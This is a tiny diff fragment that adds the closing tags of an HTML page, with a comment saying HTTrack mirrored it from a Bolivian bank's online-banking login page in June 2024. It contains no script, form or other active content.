+    </div>
+</body>
+
+<!-- Mirrored from econet.bancoecofuturo.com.bo:447/EconetWeb/Usuario/Login by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Jun 2024 00:50:01 GMT -->
+</html>
